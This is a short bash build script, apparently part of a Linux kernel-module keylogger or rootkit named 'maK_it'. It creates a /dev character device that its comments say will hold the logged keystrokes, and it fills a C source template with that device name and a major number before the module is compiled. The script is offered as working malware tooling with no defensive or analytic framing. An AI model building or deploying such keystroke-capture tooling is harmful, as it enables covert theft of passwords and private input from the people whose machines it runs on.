#!/bin/bash
#used to insert name of device where logged keys are stored

#To define items yourself use 2 arguments
#./lets_maK_it.sh [DEVICE-NAME] [MAJOR-NUMBER]


KERN=$(uname -r)
IN="template.c"
OUT="maK_it.c"

BREAK="----------------------------"

echo $BREAK
#Templates to be replaced
DEV="DEVICE_NAME_TEMPLATE"
MAJOR="DEVICE_MAJOR_TEMPLATE"
ARG1="maK_it"
ARG2="33"

if [ -n "$1" ]; then ARG1="$1"; fi
DEV_NAME="DEVICE_NAME \"$ARG1\""
if [ -n "$2" ]; then ARG2="$2"; fi
MAJ_NAME="DEVICE_MAJOR $ARG2"

echo "Building '$OUT' file using /dev/$ARG1 for Device Name and $ARG2 as a Major Number..."
rm -f /dev/$ARG1 #Making sure it's cleared
echo "Creating virtual device /dev/$ARG1"
mknod /dev/$ARG1 c $ARG2 0
echo "Keys will be logged to virtual device."
sed -e "s/$DEV/$DEV_NAME/g;s/$MAJOR/$MAJ_NAME/g" < $IN  > $OUT
echo "Completed. Run make command"
echo $BREAK

